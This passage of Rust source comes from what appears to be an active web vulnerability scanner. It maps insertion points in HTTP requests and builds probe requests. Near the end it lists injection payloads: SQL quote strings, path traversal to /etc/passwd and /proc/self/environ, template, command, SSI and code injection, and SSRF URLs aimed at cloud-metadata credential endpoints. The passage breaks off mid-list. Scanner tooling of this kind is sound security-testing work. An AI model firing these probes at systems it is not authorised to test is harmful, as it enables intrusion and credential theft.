                Matcher::Stored(m) => m.serial(),
                _ => false,
            }
    }

    /// True when the check can only be decided after several probes have
    /// completed. The runner keeps those exchanges and discards single-shot
    /// responses so memory stays bounded on large scans.
    pub fn needs_series(&self) -> bool {
        match &self.matcher {
            Matcher::Series { .. } | Matcher::Stored(_) | Matcher::Stylesheet(_) => true,
            Matcher::Advanced(matcher) => matcher.series_result(),
            _ => false,
        }
    }
}

#[derive(Clone, Debug)]
enum Location {
    Query {
        index: usize,
        name: bool,
    },
    Body {
        start: usize,
        end: usize,
        json: bool,
        raw: bool,
    },
    Cookie {
        index: usize,
    },
    Header {
        index: usize,
    },
    Path {
        start: usize,
        end: usize,
    },
}
#[derive(Clone, Debug)]
enum Wrap {
    Json { prefix: String, suffix: String },
    Base64 { url: bool, padded: bool },
    Percent,
}
#[derive(Clone, Debug)]
struct Point {
    name: String,
    label: String,
    original: String,
    location: Location,
    wraps: Vec<Wrap>,
}

fn encoded(value: &str) -> String {
    url::form_urlencoded::byte_serialize(value.as_bytes()).collect()
}
fn decoded(value: &str) -> String {
    url::form_urlencoded::parse(format!("x={value}").as_bytes())
        .next()
        .map(|(_, v)| v.into_owned())
        .unwrap_or_default()
}
/// Cookie-octet-safe encoding. Semicolons, commas, spaces, quotes and percent
/// signs are encoded so a payload cannot terminate the Cookie header; targets
/// that decode their cookie values still receive the original injection text.
fn cookie_value(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for byte in value.bytes() {
        match byte {
            b';' => out.push_str("%3B"),
            b',' => out.push_str("%2C"),
            b'"' => out.push_str("%22"),
            b'\\' => out.push_str("%5C"),
            b' ' => out.push_str("%20"),
            b'%' => out.push_str("%25"),
            b'\r' | b'\n' => {}
            byte if byte.is_ascii() => out.push(byte as char),
            byte => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}
/// Path-safe encoding that deliberately retains `/`, `.`, quotes and shell
/// metacharacters. Traversal payloads must be able to introduce new segments;
/// form encoding would turn every slash into `%2F` and defeat that context.
fn path_encoded(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for byte in value.bytes() {
        match byte {
            b'?' => out.push_str("%3F"),
            b'#' => out.push_str("%23"),
            b'%' => out.push_str("%25"),
            b' ' => out.push_str("%20"),
            b'\r' => out.push_str("%0D"),
            b'\n' => out.push_str("%0A"),
            b'\t' => out.push_str("%09"),
            byte if byte.is_ascii() => out.push(byte as char),
            byte => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}
fn origin_target(message: &Message, dest: &Destination) -> anyhow::Result<String> {
    let u = url::Url::parse(&message.url(dest))?;
    Ok(format!(
        "{}{}",
        u.path(),
        u.query().map(|q| format!("?{q}")).unwrap_or_default()
    ))
}
fn replace_target(message: &mut Message, target: &str) {
    let method = message.method().to_owned();
    let version = message
        .start
        .split_whitespace()
        .nth(2)
        .unwrap_or("HTTP/1.1")
        .to_owned();
    message.start = format!("{method} {target} {version}");
}
fn json_spans(body: &str, limit: usize) -> Vec<(String, usize, usize, String)> {
    // Token coordinates retain untouched JSON bytes, duplicate keys, and number
    // spelling. A complete serde parse rejects malformed inputs before mutation.
    // Parsing stops at `limit` so a very large document cannot expand into an
    // unbounded insertion-point list.
    if limit == 0 || serde_json::from_str::<serde_json::Value>(body).is_err() {
        return vec![];
    }
    let b = body.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    let mut last_key = String::new();
    while i < b.len() && out.len() < limit {
        if b[i] == b'"' {
            let start = i;
            i += 1;
            let mut escape = false;
            while i < b.len() {
                let c = b[i];
                i += 1;
                if escape {
                    escape = false;
                } else if c == b'\\' {
                    escape = true;
                } else if c == b'"' {
                    break;
                }
            }
            let token = &body[start..i];
            let value = serde_json::from_str::<String>(token).unwrap_or_default();
            let mut next = i;
            while next < b.len() && b[next].is_ascii_whitespace() {
                next += 1;
            }
            if b.get(next) == Some(&b':') {
                last_key = value;
            } else {
                out.push((last_key.clone(), start, i, value));
            }
        } else if b[i] == b'-'
            || b[i].is_ascii_digit()
            || b[i..].starts_with(b"true")
            || b[i..].starts_with(b"false")
            || b[i..].starts_with(b"null")
        {
            let start = i;
            while i < b.len() && !b",]} \r\n\t".contains(&b[i]) {
                i += 1;
            }
            out.push((last_key.clone(), start, i, body[start..i].into()));
        } else {
            i += 1;
        }
    }
    out
}
fn allowed_parameter(name: &str, settings: &ScanSettings) -> bool {
    !settings.excluded_parameters.iter().any(|pattern| {
        if let Some(prefix) = pattern.strip_suffix('*') {
            name.to_ascii_lowercase()
                .starts_with(&prefix.to_ascii_lowercase())
        } else {
            pattern.eq_ignore_ascii_case(name)
        }
    })
}
fn points(
    request: &Message,
    dest: &Destination,
    settings: &ScanSettings,
) -> anyhow::Result<Vec<Point>> {
    // Buckets keep one large family (for example a long query string) from
    // consuming the insertion-point budget of every other family. The final
    // round-robin merge preserves at least one point per enabled family.
    const QUERY_VALUE: usize = 0;
    const QUERY_NAME: usize = 1;
    const BODY_VALUE: usize = 2;
    const BODY_NAME: usize = 3;
    const COOKIE: usize = 4;
    const HEADER: usize = 5;
    const PATH: usize = 6;
    const NESTED: usize = 7;
    let mut buckets: [Vec<Point>; 8] = Default::default();
    // Bound construction itself, not only the final merge. A request with a
    // very large parameter list must not allocate one Point per parameter.
    let source_cap = settings.max_insertion_points.saturating_mul(4).max(32);
    let target = origin_target(request, dest)?;
    if let Some((_, query)) = target.split_once('?') {
        for (index, part) in query.split('&').enumerate() {
            if (!settings.scan_query_values || buckets[QUERY_VALUE].len() >= source_cap)
                && (!settings.scan_parameter_names || buckets[QUERY_NAME].len() >= source_cap)
            {
                break;
            }
            let (name, value) = part.split_once('=').unwrap_or((part, ""));
            let name = decoded(name);
            if !allowed_parameter(&name, settings) {
                continue;
            }
            if settings.scan_query_values && buckets[QUERY_VALUE].len() < source_cap {
                buckets[QUERY_VALUE].push(Point {
                    name: name.clone(),
                    label: format!("URL parameter {name} [{index}]"),
                    original: decoded(value),
                    location: Location::Query { index, name: false },
                    wraps: vec![],
                });
            }
            if settings.scan_parameter_names && buckets[QUERY_NAME].len() < source_cap {
                buckets[QUERY_NAME].push(Point {
                    name: name.clone(),
                    label: format!("URL parameter name {name} [{index}]"),
                    original: name,
                    location: Location::Query { index, name: true },
                    wraps: vec![],
                });
            }
        }
    }
    let ct_raw = request.header("Content-Type").unwrap_or("");
    let ct = ct_raw.to_ascii_lowercase();
    if let Ok(body) = std::str::from_utf8(&request.body) {
        if ct.starts_with("application/x-www-form-urlencoded") {
            let mut offset = 0;
            for (index, part) in body.split('&').enumerate() {
                if (!settings.scan_form_values || buckets[BODY_VALUE].len() >= source_cap)
                    && (!settings.scan_parameter_names || buckets[BODY_NAME].len() >= source_cap)
                {
                    break;
                }
                let (raw_name, value) = part.split_once('=').unwrap_or((part, ""));
                let name = decoded(raw_name);
                if allowed_parameter(&name, settings) {
                    let start = offset + raw_name.len() + usize::from(part.contains('='));
                    if settings.scan_form_values && buckets[BODY_VALUE].len() < source_cap {
                        buckets[BODY_VALUE].push(Point {
                            name: name.clone(),
                            label: format!("Body parameter {name} [{index}]"),
                            original: decoded(value),
                            location: Location::Body {
                                start,
                                end: offset + part.len(),
                                json: false,
                                raw: false,
                            },
                            wraps: vec![],
                        });
                    }
                    if settings.scan_parameter_names && buckets[BODY_NAME].len() < source_cap {
                        buckets[BODY_NAME].push(Point {
                            name: name.clone(),
                            label: format!("Body parameter name {name} [{index}]"),
                            original: name,
                            location: Location::Body {
                                start: offset,
                                end: offset + raw_name.len(),
                                json: false,
                                raw: false,
                            },
                            wraps: vec![],
                        });
                    }
                }
                offset += part.len() + 1;
            }
        } else if ct.contains("json") {
            for (index, (name, start, end, value)) in json_spans(
                body,
                settings.max_insertion_points.saturating_mul(4).max(16),
            )
            .into_iter()
            .enumerate()
            {
                if settings.scan_json_values && allowed_parameter(&name, settings) {
                    buckets[BODY_VALUE].push(Point {
                        name: name.clone(),
                        label: format!("JSON value {name} [{index}]"),
                        original: value,
                        location: Location::Body {
                            start,
                            end,
                            json: true,
                            raw: false,
                        },
                        wraps: vec![],
                    });
                }
            }
            if settings.scan_json_body && serde_json::from_str::<serde_json::Value>(body).is_ok() {
                buckets[BODY_VALUE].push(Point {
                    name: "$body".into(),
                    label: "Entire JSON body".into(),
                    original: body.into(),
                    location: Location::Body {
                        start: 0,
                        end: body.len(),
                        json: false,
                        raw: true,
                    },
                    wraps: vec![],
                });
            }
        } else if ct.contains("xml") {
            let r = Regex::new(
                r"<([A-Za-z_][A-Za-z0-9_.:-]*)\b[^>]*>([^<>]*)</[A-Za-z_][A-Za-z0-9_.:-]*\s*>",
            )?;
            for (index, caps) in r.captures_iter(body).enumerate() {
                if buckets[BODY_VALUE].len() >= source_cap {
                    break;
                }
                let name = &caps[1];
                if settings.scan_xml_elements && allowed_parameter(name, settings) {
                    let v = caps.get(2).unwrap();
                    buckets[BODY_VALUE].push(Point {
                        name: name.into(),
                        label: format!("XML element {name} [{index}]"),
                        original: v.as_str().into(),
                        location: Location::Body {
                            start: v.start(),
                            end: v.end(),
                            json: false,
                            raw: false,
                        },
                        wraps: vec![],
                    });
                }
            }
            let tags = Regex::new(r"<[A-Za-z_][^<>]*>")?;
            let attrs = Regex::new(r#"([A-Za-z_][A-Za-z0-9_.:-]*)\s*=\s*(?:"([^"]*)"|'([^']*)')"#)?;
            for (tag_index, tag) in tags.find_iter(body).enumerate() {
                for (attr_index, caps) in attrs.captures_iter(tag.as_str()).enumerate() {
                    if buckets[BODY_VALUE].len() >= source_cap {
                        break;
                    }
                    let name = &caps[1];
                    if !settings.scan_xml_attributes
                        || name.starts_with("xmlns")
                        || !allowed_parameter(name, settings)
                    {
                        continue;
                    }
                    let v = caps.get(2).or_else(|| caps.get(3)).unwrap();
                    buckets[BODY_VALUE].push(Point {
                        name: name.into(),
                        label: format!("XML attribute {name} [{tag_index}:{attr_index}]"),
                        original: v.as_str().into(),
                        location: Location::Body {
                            start: tag.start() + v.start(),
                            end: tag.start() + v.end(),
                            json: false,
                            raw: false,
                        },
                        wraps: vec![],
                    });
                }
            }
        } else if ct.starts_with("multipart/form-data")
            && let Some(boundary) = ct_raw.split(';').find_map(|v| {
                v.trim()
                    .split_once('=')
                    .filter(|(k, _)| k.trim().eq_ignore_ascii_case("boundary"))
                    .map(|(_, v)| v.trim().trim_matches('"'))
            })
        {
            let delim = format!("--{boundary}");
            let mut offset = 0;
            let names = Regex::new(r#"(?i)\bname="([^"]+)""#)?;
            let filenames = Regex::new(r#"(?i)\bfilename="([^"]*)""#)?;
            for (part_index, part) in body.split(&delim).enumerate() {
                if buckets[BODY_VALUE].len() >= source_cap {
                    break;
                }
                if let Some((headers, content)) = part.split_once("\r\n\r\n")
                    && let Some(name) = names
                        .captures(headers)
                        .and_then(|c| c.get(1).map(|m| m.as_str().to_owned()))
                    && allowed_parameter(&name, settings)
                {
                    if let Some(filename) = filenames.captures(headers).and_then(|c| c.get(1)) {
                        if settings.scan_multipart_filenames {
                            buckets[BODY_VALUE].push(Point {
                                name: name.clone(),
                                label: format!("Multipart filename {name} [{part_index}]"),
                                original: filename.as_str().into(),
                                location: Location::Body {
                                    start: offset + filename.start(),
                                    end: offset + filename.end(),
                                    json: false,
                                    raw: false,
                                },
                                wraps: vec![],
                            });
                        }
                    } else if settings.scan_multipart_values {
                        let start = offset + headers.len() + 4;
                        let len = content.strip_suffix("\r\n").unwrap_or(content).len();
                        buckets[BODY_VALUE].push(Point {
                            name: name.clone(),
                            label: format!("Multipart parameter {name} [{part_index}]"),
                            original: content[..len].into(),
                            location: Location::Body {
                                start,
                                end: start + len,
                                json: false,
                                raw: false,
                            },
                            wraps: vec![],
                        });
                    }
                }
                offset += part.len() + delim.len();
            }
        }
    }
    if settings.scan_cookies
        && let Some(cookie) = request.header("Cookie")
    {
        for (index, part) in cookie.split(';').enumerate() {
            if buckets[COOKIE].len() >= source_cap {
                break;
            }
            if let Some((name, value)) = part.trim().split_once('=')
                && allowed_parameter(name, settings)
            {
                buckets[COOKIE].push(Point {
                    name: name.into(),
                    label: format!("Cookie {name} [{index}]"),
                    original: value.into(),
                    location: Location::Cookie { index },
                    wraps: vec![],
                });
            }
        }
    }
    if settings.scan_headers {
        for (index, (name, value)) in request.headers.iter().enumerate() {
            if buckets[HEADER].len() >= source_cap {
                break;
            }
            if (name.eq_ignore_ascii_case("Referer")
                || name.eq_ignore_ascii_case("User-Agent")
                || name.eq_ignore_ascii_case("Accept")
                || name.eq_ignore_ascii_case("Accept-Language")
                || name.eq_ignore_ascii_case("Forwarded")
                || name.eq_ignore_ascii_case("From")
                || name.to_ascii_lowercase().starts_with("x-"))
                && allowed_parameter(name, settings)
            {
                buckets[HEADER].push(Point {
                    name: name.clone(),
                    label: format!("Header {name} [{index}]"),
                    original: value.clone(),
                    location: Location::Header { index },
                    wraps: vec![],
                });
            }
        }
    }
    if settings.scan_path {
        let path = target.split('?').next().unwrap_or("/");
        let mut offset = 0;
        for (index, part) in path.split('/').enumerate() {
            if buckets[PATH].len() >= source_cap {
                break;
            }
            if !part.is_empty() {
                buckets[PATH].push(Point {
                    name: part.into(),
                    label: format!("URL path segment {part} [{index}]"),
                    original: decoded(part),
                    location: Location::Path {
                        start: offset,
                        end: offset + part.len(),
                    },
                    wraps: vec![],
                });
            }
            offset += part.len() + 1;
        }
    }
    if settings.nested {
        let snapshot: Vec<Point> = buckets.iter().flatten().cloned().collect();
        let cap = settings.max_insertion_points.saturating_mul(4).max(1);
        for point in &snapshot {
            if !settings.scan_json_values && point.label == "Entire JSON body" {
                continue;
            }
            nested_points(point, &mut buckets[NESTED], settings, 0, cap);
            if buckets[NESTED].len() >= cap {
                break;
            }
        }
    }
    let limit = settings.max_insertion_points.max(1);
    let mut iterators: Vec<std::vec::IntoIter<Point>> = buckets
        .into_iter()
        .map(|bucket| bucket.into_iter())
        .collect();
    let mut out = Vec::with_capacity(limit);
    loop {
        let mut progressed = false;
        for iterator in &mut iterators {
            if let Some(point) = iterator.next() {
                out.push(point);
                if out.len() >= limit {
                    return Ok(out);
                }
                progressed = true;
            }
        }
        if !progressed {
            break;
        }
    }
    Ok(out)
}
fn nested_points(
    point: &Point,
    out: &mut Vec<Point>,
    settings: &ScanSettings,
    depth: usize,
    cap: usize,
) {
    if depth >= 3 || point.original.len() > 256 * 1024 || out.len() >= cap {
        return;
    }
    let mut containers = vec![(point.original.clone(), vec![])];
    for (url, padded) in [(false, true), (true, false)] {
        let value = if url {
            URL_SAFE_NO_PAD.decode(&point.original)
        } else {
            STANDARD.decode(&point.original)
        };
        if let Ok(bytes) = value
            && let Ok(s) = String::from_utf8(bytes)
            && s.trim_start().starts_with(['{', '['])
        {
            containers.push((s, vec![Wrap::Base64 { url, padded }]));
        }
    }
    if point.original.contains('%') {
        let value = decoded(&point.original);
        if value != point.original && value.trim_start().starts_with(['{', '[']) {
            containers.push((value, vec![Wrap::Percent]));
        }
    }
    for (container, encoding) in containers {
        for (name, start, end, value) in
            json_spans(&container, cap.saturating_sub(out.len()).max(1))
        {
            if !allowed_parameter(&name, settings) {
                continue;
            }
            let mut wraps = vec![Wrap::Json {
                prefix: container[..start].into(),
                suffix: container[end..].into(),
            }];
            wraps.extend(encoding.clone());
            wraps.extend(point.wraps.clone());
            let child = Point {
                name: name.clone(),
                label: format!("{} → nested {name}", point.label),
                original: value,
                location: point.location.clone(),
                wraps,
            };
            out.push(child.clone());
            if out.len() >= cap {
                return;
            }
            nested_points(&child, out, settings, depth + 1, cap);
        }
    }
}
fn point_request(
    base: &Message,
    dest: &Destination,
    point: &Point,
    payload: &str,
) -> anyhow::Result<Vec<u8>> {
    let mut payload = payload.to_owned();
    for wrap in &point.wraps {
        payload = match wrap {
            Wrap::Json { prefix, suffix } => {
                format!("{prefix}{}{suffix}", serde_json::to_string(&payload)?)
            }
            Wrap::Base64 {
                url: true,
                padded: _,
            } => URL_SAFE_NO_PAD.encode(payload),
            Wrap::Base64 {
                url: false,
                padded: true,
            } => STANDARD.encode(payload),
            Wrap::Base64 {
                url: false,
                padded: false,
            } => STANDARD.encode(payload).trim_end_matches('=').into(),
            Wrap::Percent => encoded(&payload),
        };
    }
    let mut request = base.clone();
    let target = origin_target(base, dest)?;
    match point.location {
        Location::Query { index, name } => {
            let (path, query) = target.split_once('?').unwrap();
            let mut parts: Vec<_> = query.split('&').map(str::to_owned).collect();
            let (key, value) = parts[index].split_once('=').unwrap_or((&parts[index], ""));
            parts[index] = if name {
                format!("{}={value}", encoded(&payload))
            } else {
                format!("{key}={}", encoded(&payload))
            };
            replace_target(&mut request, &format!("{path}?{}", parts.join("&")));
        }
        Location::Body {
            start,
            end,
            json,
            raw,
        } => {
            let ct = base
                .header("Content-Type")
                .unwrap_or("")
                .to_ascii_lowercase();
            let replacement = if raw {
                payload.into_bytes()
            } else if json {
                serde_json::to_vec(&payload)?
            } else if ct.contains("x-www-form-urlencoded") {
                encoded(&payload).into_bytes()
            } else if point.label.starts_with("Multipart filename") {
                payload
                    .replace('\\', "\\\\")
                    .replace('"', "\\\"")
                    .replace(['\r', '\n'], "")
                    .into_bytes()
            } else {
                // XML element and attribute values are inserted raw. Escaping
                // would keep the document well formed but would also neutralize
                // the quote, bracket and markup delimiters these checks need.
                payload.into_bytes()
            };
            request.body.splice(start..end, replacement);
        }
        Location::Header { index } => {
            request.headers[index].1 = payload;
        }
        Location::Cookie { index } => {
            let mut parts: Vec<_> = base
                .header("Cookie")
                .unwrap()
                .split(';')
                .map(str::to_owned)
                .collect();
            let key = parts[index].split_once('=').unwrap().0;
            parts[index] = format!("{key}={}", cookie_value(&payload));
            request.set("Cookie", parts.join(";"));
        }
        Location::Path { start, end } => {
            let mut target = target;
            target.replace_range(start..end, &path_encoded(&payload));
            replace_target(&mut request, &target);
        }
    }
    request.normalize_length();
    Ok(request.encode())
}
fn enabled(settings: &ScanSettings, id: &str) -> bool {
    static CHECKS: std::sync::OnceLock<std::collections::BTreeMap<String, bool>> =
        std::sync::OnceLock::new();
    let checks = CHECKS.get_or_init(|| {
        catalog()
            .iter()
            .map(|d| (d.id.clone(), d.intrusive))
            .collect()
    });
    settings.check_enabled(id)
        && checks
            .get(id)
            .is_some_and(|intrusive| !*intrusive || settings.intrusive)
}
fn marker(base: &Exchange) -> String {
    let mut h = Sha256::new();
    h.update(&base.request);
    h.update(base.id.to_le_bytes());
    format!("{:x}", h.finalize())[..14].into()
}

#[derive(Clone, Copy)]
enum SqlContext {
    SingleBalanced,
    DoubleBalanced,
    NumericBalanced,
    SingleTerminated(usize),
    DoubleTerminated(usize),
    NumericTerminated(usize),
}
impl SqlContext {
    fn label(self) -> String {
        match self {
            Self::SingleBalanced => "single-balanced".into(),
            Self::DoubleBalanced => "double-balanced".into(),
            Self::NumericBalanced => "numeric-balanced".into(),
            Self::SingleTerminated(depth) => format!("single-close-{depth}"),
            Self::DoubleTerminated(depth) => format!("double-close-{depth}"),
            Self::NumericTerminated(depth) => format!("numeric-close-{depth}"),
        }
    }
    fn double_quoted(self) -> bool {
        matches!(self, Self::DoubleBalanced | Self::DoubleTerminated(_))
    }
    fn terminated_prefix(self, original: &str) -> Option<String> {
        match self {
            Self::SingleTerminated(depth) => Some(format!("{original}'{}", ")".repeat(depth))),
            Self::DoubleTerminated(depth) => Some(format!("{original}\"{}", ")".repeat(depth))),
            Self::NumericTerminated(depth) => Some(format!("{original}{}", ")".repeat(depth))),
            _ => None,
        }
    }
    fn predicate(self, original: &str, predicate: &str, marker: &str, or: bool) -> String {
        if let Some(prefix) = self.terminated_prefix(original) {
            return format!(
                "{prefix} {} ({predicate})-- ",
                if or { "OR" } else { "AND" }
            );
        }
        match self {
            Self::SingleBalanced => {
                format!("{original}' AND ({predicate}) AND '{marker}'='{marker}")
            }
            Self::DoubleBalanced => {
                format!("{original}\" AND ({predicate}) AND \"{marker}\"=\"{marker}")
            }
            Self::NumericBalanced => {
                format!("CASE WHEN ({predicate}) THEN ({original}) ELSE NULL END")
            }
            _ => unreachable!("terminated SQL context handled above"),
        }
    }
}
fn sql_contexts(original: &str) -> Vec<SqlContext> {
    // Balanced expressions preserve trailing clauses and any surrounding parentheses.
    // Terminated variants also cover applications that reject CASE or appended literals.
    let mut contexts = vec![SqlContext::SingleBalanced, SqlContext::DoubleBalanced];
    let numeric = original.trim().parse::<f64>().is_ok_and(f64::is_finite);
    if numeric {
        contexts.push(SqlContext::NumericBalanced);
    }
    for depth in 0..=2 {
        contexts.push(SqlContext::SingleTerminated(depth));
        contexts.push(SqlContext::DoubleTerminated(depth));
        if numeric {
            contexts.push(SqlContext::NumericTerminated(depth));
        }
    }
    contexts
}

/// A generated plan plus the number of enabled probes that did not fit inside
/// the configured probe or byte budget. The caller surfaces the count so a scan
/// never silently omits a whole check family.
#[derive(Clone, Debug)]
pub struct Plan {
    pub probes: Vec<Probe>,
    pub skipped: usize,
}

#[allow(clippy::too_many_arguments)]
fn admit(
    settings: &ScanSettings,
    base: &Exchange,
    probes: &mut Vec<Probe>,
    single_requests: &mut BTreeSet<(String, [u8; 32])>,
    plan_bytes: &mut usize,
    skipped: &mut usize,
    cap: usize,
    id: &str,
    point: &str,
    request: Vec<u8>,
    matcher: Matcher,
) {
    if !enabled(settings, id) {
        return;
    }
    let single_key = (!matches!(&matcher, Matcher::Series { .. }))
        .then(|| (id.to_owned(), <[u8; 32]>::from(Sha256::digest(&request))));
    if single_key
        .as_ref()
        .is_some_and(|key| single_requests.contains(key))
    {
        return;
    }
    if probes.len() >= cap
        || request.len()
            > 64usize
                .saturating_mul(1024 * 1024)
                .saturating_sub(*plan_bytes)
    {
        *skipped += 1;
        return;
    }
    if let Some(key) = single_key {
        single_requests.insert(key);
    }
    *plan_bytes += request.len();
    probes.push(Probe {
        issue_id: id.into(),
        insertion_point: point.into(),
        request,
        destination: base.destination.clone(),
        raw: false,
        matcher,
    });
}

pub fn active_plan(base: &Exchange, settings: &ScanSettings) -> anyhow::Result<Vec<Probe>> {
    Ok(active_plan_with_stats(base, settings)?.probes)
}

pub fn active_plan_with_stats(base: &Exchange, settings: &ScanSettings) -> anyhow::Result<Plan> {
    settings.validate()?;
    let request = Message::parse(&base.request)?;
    let marker = marker(base);
    // Request-level probes are admitted before per-insertion-point probes so a
    // parameter-heavy request can never starve CORS, TRACE, resource exposure,
    // GraphQL or JWT checks. Point probes are capped separately and merged
    // afterwards against whatever budget remains.
    let mut probes: Vec<Probe> = Vec::new();
    let mut point_probes: Vec<Probe> = Vec::new();
    let mut single_requests = BTreeSet::new();
    let mut plan_bytes = 0usize;
    let mut point_bytes = 0usize;
    let mut skipped = 0usize;
    let mut point_skipped = 0usize;
    let point_cap = settings.max_probes_per_request.saturating_mul(2).max(1);
    for point in points(&request, &base.destination, settings)? {
        if !allowed_parameter(&point.name, settings) {
            continue;
        }
        let mut at = |id: &str, payload: &str, matcher: Matcher| -> anyhow::Result<()> {
            admit(
                settings,
                base,
                &mut point_probes,
                &mut single_requests,
                &mut point_bytes,
                &mut point_skipped,
                point_cap,
                id,
                &point.label,
                point_request(&request, &base.destination, &point, payload)?,
                matcher,
            );
            Ok(())
        };
        for payload in ["'\"`)", "'", "\"", "\\", "';", "\")"] {
            at("sqli-error", payload, Matcher::SqlError)?;
        }
        for (token, payload) in xss_payloads(&marker) {
            at(
                "xss-reflected",
                &payload,
                Matcher::Xss {
                    token,
                    payload: payload.clone(),
                },
            )?;
        }
        if enabled(settings, "input-reflected") && reflection::supports_point(&point) {
            let token = reflection::canary(base, &point, "input-reflected");
            at(
                "input-reflected",
                &token,
                Matcher::ReflectedInput(token.clone()),
            )?;
        }
        if enabled(settings, "input-transformed") && reflection::supports_point(&point) {
            let token = reflection::canary(base, &point, "input-transformed");
            for (marker, payload) in reflection::transformed_payloads(&token) {
                at(
                    "input-transformed",
                    &payload,
                    Matcher::ReflectedInput(marker),
                )?;
            }
        }
        for (id,payload,matcher) in [
            ("header-injection",format!("\r\nX-Ferrite-{marker}: {marker}"),Matcher::Header(marker.clone())),
            ("open-redirect",format!("https://{marker}.invalid/ferrite"),Matcher::Redirect(format!("{marker}.invalid"))),
            ("open-redirect",format!("http://{marker}.invalid/ferrite"),Matcher::Redirect(format!("{marker}.invalid"))),
            ("open-redirect",format!("//{marker}.invalid/ferrite"),Matcher::Redirect(format!("{marker}.invalid"))),
            ("open-redirect",format!("https://target.example@{marker}.invalid/ferrite"),Matcher::Redirect(format!("{marker}.invalid"))),
            ("path-traversal","../../../../../../../../etc/passwd".into(),Matcher::Contains{value:"file:passwd".into(),absent:String::new()}),
            ("path-traversal","../../../../../../../../etc/hosts".into(),Matcher::Contains{value:"file:hosts".into(),absent:String::new()}),
            ("path-traversal","../../../../../../../../proc/self/environ".into(),Matcher::Contains{value:"file:environ".into(),absent:String::new()}),
            ("path-traversal","/etc/passwd".into(),Matcher::Contains{value:"file:passwd".into(),absent:String::new()}),
            ("path-traversal","..\\..\\..\\..\\windows\\win.ini".into(),Matcher::Contains{value:"file:winini".into(),absent:String::new()}),
            ("path-traversal","..\\..\\..\\..\\boot.ini".into(),Matcher::Contains{value:"file:bootini".into(),absent:String::new()}),
            ("path-traversal","C:\\windows\\win.ini".into(),Matcher::Contains{value:"file:winini".into(),absent:String::new()}),
            ("template-injection",format!("fer{marker}{{{{719*733}}}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}{{{{719*733}}}}end{marker}")}),
            ("template-injection",format!("fer{marker}${{719*733}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}${{719*733}}end{marker}")}),
            ("template-injection",format!("fer{marker}#{{719*733}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}#{{719*733}}end{marker}")}),
            ("template-injection",format!("fer{marker}<%= 719*733 %>end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}<%= 719*733 %>end{marker}")}),
            ("template-injection",format!("fer{marker}{{719*733}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}{{719*733}}end{marker}")}),
            ("template-injection",format!("fer{marker}[[${{719*733}}]]end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}[[${{719*733}}]]end{marker}")}),
            ("template-injection",format!("fer{marker}${{{{719*733}}}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}${{{{719*733}}}}end{marker}")}),
            ("template-injection",format!("fer{marker}{{=719*733}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}{{=719*733}}end{marker}")}),
            ("template-injection",format!("fer{marker}@(719*733)end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}@(719*733)end{marker}")}),
            ("template-injection",format!("fer{marker}*{{719*733}}end{marker}"),Matcher::Contains{value:format!("fer{marker}527027end{marker}"),absent:format!("fer{marker}*{{719*733}}end{marker}")}),
            ("command-injection",format!(";printf 'fer%s' 'rite{marker}';"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("|printf 'fer%s' 'rite{marker}'"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("$(printf 'fer%s' 'rite{marker}')"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("`printf 'fer%s' 'rite{marker}'`"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("&&printf 'fer%s' 'rite{marker}'&&"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("&set a=fer&set b=rite{marker}&call echo %a%%b%&"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("command-injection",format!("&powershell -c \"Write-Output ('fer'+'rite{marker}')\"&"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("file-uri","file:///etc/passwd".into(),Matcher::Contains{value:"file:passwd".into(),absent:String::new()}),
            ("file-uri","file:///etc/hosts".into(),Matcher::Contains{value:"file:hosts".into(),absent:String::new()}),
            ("file-uri","file:///c:/windows/win.ini".into(),Matcher::Contains{value:"file:winini".into(),absent:String::new()}),
            ("ssrf-inline","http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance".into(),Matcher::Contains{value:"metadata:credentials".into(),absent:String::new()}),
            ("ssrf-inline","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".into(),Matcher::Contains{value:"cloud:token".into(),absent:String::new()}),
            ("ssrf-inline","http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".into(),Matcher::Contains{value:"cloud:token".into(),absent:String::new()}),
            ("ssi-injection",format!("<!--#exec cmd=\"printf 'fer%s' 'rite{marker}'\" -->"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("ssi-injection",format!("<!--#exec cmd=\"perl -e 'print qq(fer),qq(rite{marker})'\" -->"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';print('fer'.'rite{marker}');$f='"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';print('fer'+'rite{marker}');#"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("' + ('fer'+'rite{marker}') + '"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
            ("code-injection",format!("';echo 'fer'.'rite{marker}';//"),Matcher::Contains{value:format!("ferrite{marker}"),absent:String::new()}),
